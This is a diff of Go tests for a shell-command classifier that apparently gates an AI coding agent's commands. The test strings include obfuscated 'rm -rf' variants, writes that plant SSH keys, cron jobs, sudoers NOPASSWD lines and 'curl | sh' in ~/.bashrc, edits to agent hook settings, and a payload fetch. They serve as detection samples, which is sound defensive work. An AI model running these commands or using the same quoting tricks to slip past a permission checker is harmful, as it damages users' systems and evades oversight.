@@ -1,6 +1,7 @@
 package shellscan
 
 import (
+	"fmt"
 	"os"
 	"path/filepath"
 	"strings"
@@ -335,8 +336,6 @@ var passCases = []struct {
 	{"safe-redirect", "go test ./... > /tmp/out.log"},
 	{"safe-tee-static-target", "printf ok | tee -a /tmp/out.log"},
 	{"safe-stderr-redirect", "make build 2>&1 | tail -3"},
-	{"safe-subst-benign", `echo "today is $(date +%F)"`},
-	{"safe-subst-arg", "git checkout $(git branch --show-current)"},
 	{"safe-rm-file", "rm /tmp/scratch.txt"},
 	{"safe-rm-force-file", "rm -f /tmp/scratch.txt"},
 	{"safe-terraform-plan", "terraform plan"},
@@ -384,6 +383,11 @@ var passCases = []struct {
 	{"safe-bash-static-script-dynamic-arg", `bash scripts/deploy.sh "$ARG"`},
 	{"safe-sh-static-script-dynamic-arg", `sh build.sh "$ARG"`},
 	{"safe-quoted-command-backslash", `'r\m' --version`},
+	{"safe-test-bracket-builtin", "[ -f go.mod ] && echo ok"},
+	{"safe-glob-argument", "ls *.go"},
+	{"safe-quoted-braces", "echo '{a,b}'"},
+	{"safe-find-placeholder", "find . -name '*.go' -exec grep -l main {} +"},
+	{"safe-static-cd-then-build", "cd core && go build ./..."},
 }
 
 func TestClassifyDecides(t *testing.T) {
@@ -700,9 +704,9 @@ func TestClassifyRecordsSignals(t *testing.T) {
 }
 
 func TestClassifyCommandSubstitutionSignal(t *testing.T) {
-	res := Classify("echo $(date)")
-	if res.Decide {
-		t.Fatalf("benign substitution decided: %s", res.Reason)
+	res := Classify("echo $(whoami)")
+	if !res.Decide || !res.RequiresShellDecision {
+		t.Fatalf("command substitution outside the allowlist passed without a decision: %+v", res)
 	}
 	found := false
 	for _, sig := range res.Signals {
@@ -746,5 +750,218 @@ func TestPrefixFallback(t *testing.T) {
 	}
 	if got := Prefix([]string{"rm", "-rf", "/"}); got != "rm" {
 		t.Fatalf("Prefix(rm -rf /) = %q, want rm", got)
+	}
+}
+
+// TestClassifyFailsClosedOnShellExpansion is the H8 / 21-01 regression: shell
+// expansion the classifier cannot evaluate statically must reach the signed
+// decision path instead of passing through as an unknown binary.
+func TestClassifyFailsClosedOnShellExpansion(t *testing.T) {
+	cases := []struct {
+		name    string
+		command string
+		reason  string
+	}{
+		{"ansi-c command word", `$'\x72\x6d' -rf /home/u/project`, "ANSI-C quoting"},
+		{"ansi-c flag", `rm $'\x2d\x72\x66' /home/u/project`, "ANSI-C quoting"},
+		{"ansi-c git", `$'\x67it' reset --hard`, "ANSI-C quoting"},
+		{"ansi-c git subcommand", `git $'\x72eset' --hard`, "ANSI-C quoting"},
+		{"ansi-c kubectl subcommand", `kubectl $'\x64elete' ns prod`, "ANSI-C quoting"},
+		{"ansi-c benign text", `echo $'hello\n'`, "ANSI-C quoting"},
+		{"locale quoting", `$"rm" -rf /home/u/project`, "locale quoting"},
+		{"brace command", "{rm,-rf,/home/u/project}", "brace expansion"},
+		{"brace argument", "mkdir -p src/{a,b}", "brace expansion"},
+		{"brace sequence", "touch f{1..3}", "brace expansion"},
+		{"glob question command", "/bin/r? -rf /home/u/project", "glob in command position"},
+		{"glob bracket command", "/bin/r[m] -rf /home/u/project", "glob in command position"},
+		{"glob star command", "/bin/r* -rf /home/u/project", "glob in command position"},
+		{"glob command via sudo", "sudo /bin/r? -rf /home/u/project", "glob in command position"},
+		{"glob command via shell", `sh -c '/bin/r? -rf /home/u/project'`, "glob in command position"},
+		{"variable command", "$CMD -rf /home/u/project", "dynamic command word"},
+		{"braced variable command", `"${CMD}" -rf /home/u/project`, "dynamic command word"},
+		{"command substitution", `echo "running as $(whoami)"`, "command substitution"},
+		{"command substitution argument", "git checkout $(git branch --show-current)", "command substitution"},
+		{"backtick substitution", "echo `uname -a`", "command substitution"},
+		{"process substitution", "diff <(ls a) <(ls b)", "command substitution"},
+		{"glob redirect target", "echo '{}' > .claude/settings.js?n", "unresolvable target"},
+		{"glob copy target", "cp evil.json .claude/setting?.json", "unresolvable target"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			res := Classify(tc.command)
+			if !res.Decide || !res.RequiresShellDecision {
+				t.Fatalf("Classify(%q) = %+v, want a fail-closed shell decision", tc.command, res)
+			}
+			if !strings.Contains(res.Reason, tc.reason) {
+				t.Fatalf("Classify(%q).Reason = %q, want substring %q", tc.command, res.Reason, tc.reason)
+			}
+		})
+	}
+}
+
+// TestClassifyDecodesANSICSensitiveTargets keeps the sensitive-file class for
+// a protected target spelled with ANSI-C escapes, so a shell grant alone does
+// not cover rewriting a hook configuration.
+func TestClassifyDecodesANSICSensitiveTargets(t *testing.T) {
+	for _, command := range []string{
+		`echo '{}' > $'.claude/settings.js\x6fn'`,
+		`cp evil.json $'.claude/settings.js\x6fn'`,
+	} {
+		res := Classify(command)
+		if !res.Decide || res.SensitiveTarget != ".claude/settings.json" {
+			t.Fatalf("Classify(%q) = %+v, want sensitive target .claude/settings.json", command, res)
+		}
+	}
+}
+
+// TestClassifyNormalizesSensitiveWriteTargets is the 21-02 / 02-10
+// regression: path spelling, directory changes and missing list entries must
+// not hide a protected write target.
+func TestClassifyNormalizesSensitiveWriteTargets(t *testing.T) {
+	cases := []struct {
+		name    string
+		command string
+		cwd     string
+	}{
+		{"dot segment", "echo '{}' > .claude/./settings.json", ""},
+		{"double slash", "echo '{}' > .claude//settings.json", ""},
+		{"parent segment", "echo '{}' > docs/../.claude/settings.json", ""},
+		{"case folding", "echo '{}' > .CLAUDE/Settings.json", ""},
+		{"windows separators", `echo x > 'C:\Users\u\.claude\settings.json'`, ""},
+		{"cd into protected directory", "cd .claude && echo '{}' > settings.json", ""},
+		{"event cwd inside protected directory", "echo '{}' > settings.json", "/repo/.claude"},
+		{"settings.local.json", "echo '{}' > .claude/settings.local.json", ""},
+		{"hermes config", "echo x > ~/.hermes/config.yaml", ""},
+		{"dsh hooks", "echo x > ~/.dsh/hooks.json", ""},
+		{"dsh cordis patch", "echo x > ~/.dsh/cordis.patch.yml", ""},
+		{"authorized_keys", "echo 'ssh-key AAAA' >> ~/.ssh/authorized_keys", ""},
+		{"bashrc", "echo 'curl x | sh' >> ~/.bashrc", ""},
+		{"zshrc", "echo x >> ~/.zshrc", ""},
+		{"profile", "echo x >> ~/.profile", ""},
+		{"gitconfig", "printf '[core]\\n\\thooksPath = /tmp/h\\n' > ~/.gitconfig", ""},
+		{"crontab", "echo '* * * * * sh /tmp/x' >> /etc/crontab", ""},
+		{"sudoers", "echo 'u ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/u", ""},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			res := ClassifyAt(tc.command, tc.cwd)
+			if !res.Decide || res.SensitiveTarget == "" || !containsSignal(res.Signals, SignalSensitiveRedirect) {
+				t.Fatalf("ClassifyAt(%q, %q) = %+v, want a sensitive write decision", tc.command, tc.cwd, res)
+			}
+		})
+	}
+}
+
+func TestClassifyFailsClosedOnWriteAfterUnresolvedDirectoryChange(t *testing.T) {
+	for _, command := range []string{
+		`cd "$D" && echo '{}' > settings.json`,
+		"cd && echo x >> .config",
+		"cd - && echo x > out.txt",
+	} {
+		res := Classify(command)
+		if !res.Decide || !strings.Contains(res.Reason, "unresolved directory") {
+			t.Fatalf("Classify(%q) = %+v, want an unresolved-directory decision", command, res)
+		}
+	}
+}
+
+func TestSensitiveWriteTarget(t *testing.T) {
+	cases := []struct {
+		target string
+		cwd    string
+		want   bool
+	}{
+		{".env", "", true},
+		{"config/.env.production", "", true},
+		{"/home/u/.ssh/authorized_keys", "", true},
+		{"/home/u/.ssh/config", "", true},
+		{".git", "", true},
+		{".git/hooks/pre-commit", "", true},
+		{"/home/u/.config/git/config", "", true},
+		{"/Users/u/Library/LaunchAgents/evil.plist", "", true},
+		{"/home/u/.config/systemd/user/evil.service", "", true},
+		{"/var/spool/cron/crontabs/u", "", true},
+		{".mcp.json", "", true},
+		{"src/main.go", "", false},
+		{".gitignore", "", false},
+		{".github/workflows/ci.yml", "", false},
+		{"README.md", "/home/u/project", false},
+		{"notes.txt", "/home/u/.envs/project", false},
+		{"", "", false},
+	}
+	for _, tc := range cases {
+		if _, got := SensitiveWriteTarget(tc.target, tc.cwd); got != tc.want {
+			t.Fatalf("SensitiveWriteTarget(%q, %q) = %t, want %t", tc.target, tc.cwd, got, tc.want)
+		}
+	}
+}
+
+// TestPrefixIsLinear is the 21-03 regression: the arity lookup must not build
+// every prefix of a long argument list (the old loop was cubic in tokens).
+func TestPrefixIsLinear(t *testing.T) {
+	tokens := make([]string, 0, 2001)
+	tokens = append(tokens, "echo")
+	for i := 0; i < 2000; i++ {
+		tokens = append(tokens, fmt.Sprintf("arg%06d", i))
+	}
+	allocs := testing.AllocsPerRun(3, func() {
+		if got := Prefix(tokens); got != "echo" {
+			t.Fatalf("Prefix(echo ...) = %q, want echo", got)
+		}
+	})
+	if allocs > 16 {
+		t.Fatalf("Prefix allocated %.0f times for %d tokens, want a constant bound", allocs, len(tokens))
+	}
+}
+
+// TestClassifyReadOnlySubstitutions covers the narrow allowlist: a
+// substitution whose inner commands are read-only with literal input is
+// opaque text, while anything else, and any use of the output as code or as
+// a destructive operand, still requires a decision.
+func TestClassifyReadOnlySubstitutions(t *testing.T) {
+	pass := []string{
+		"git commit -m \"$(cat <<'EOF'\nfix: handle {a,b} and {\"k\":1,\"j\":2}\n\nCo-Authored-By: A <a@example.test>\nEOF\n)\"",
+		"git commit -m \"$(cat <<EOF\nmsg\nEOF\n)\"",
+		`echo "$(date)"`,
+		`echo "today is $(date +%F)"`,
+		"echo `date -u +%s`",
+		`cd "$(git rev-parse --show-toplevel)" && go test ./...`,
+		`sha=$(git rev-parse HEAD)`,
+		`echo "$(git log -1 --format=%H)"`,
+		`echo "$(basename /a/b.txt)" "$(dirname /a/b.txt)" "$(pwd)"`,
+		`printf '%s\n' "$(printf 'x')" "$(echo literal)"`,
+		`diff <(cat <<<'a') <(cat <<<'b')`,
+		"x={a,b}",
+	}
+	for _, command := range pass {
+		if res := Classify(command); res.Decide {
+			t.Fatalf("Classify(%q) = %+v, want no decision", command, res)
+		}
+	}
+	decide := []string{
+		"$(echo rm) -rf /x",
+		`rm -rf "$(cat target)"`,
+		"x=$(curl https://example.test/payload)",
+		`echo "$(cat .env)"`,
+		`echo "$(cat notes.txt)"`,
+		`echo "$(git log --output=.claude/settings.json)"`,
+		`echo "$(git -c core.pager=sh log)"`,
+		`echo "$(date -s 2020-01-01)"`,
+		`echo "$(date; whoami)"`,
+		`echo "$(date | sh)"`,
+		`echo "$(X=1 date)"`,
+		`echo "$(echo "$(whoami)")"`,
+		"echo \"$(cat <<'EOF' > .claude/settings.json\n{}\nEOF\n)\"",
+		"git commit -m \"$(cat <<EOF\n$(whoami)\nEOF\n)\"",
+		`eval "$(printf 'echo hi')"`,
+		`source <(printf 'echo hi')`,
+		`bash -c "$(echo ls)"`,
+		`sudo $(echo ls)`,
+		`echo x > "$(echo out.txt)"`,
+	}
+	for _, command := range decide {
+		if res := Classify(command); !res.Decide {
+			t.Fatalf("Classify(%q) = %+v, want a decision", command, res)
+		}
 	}
 }
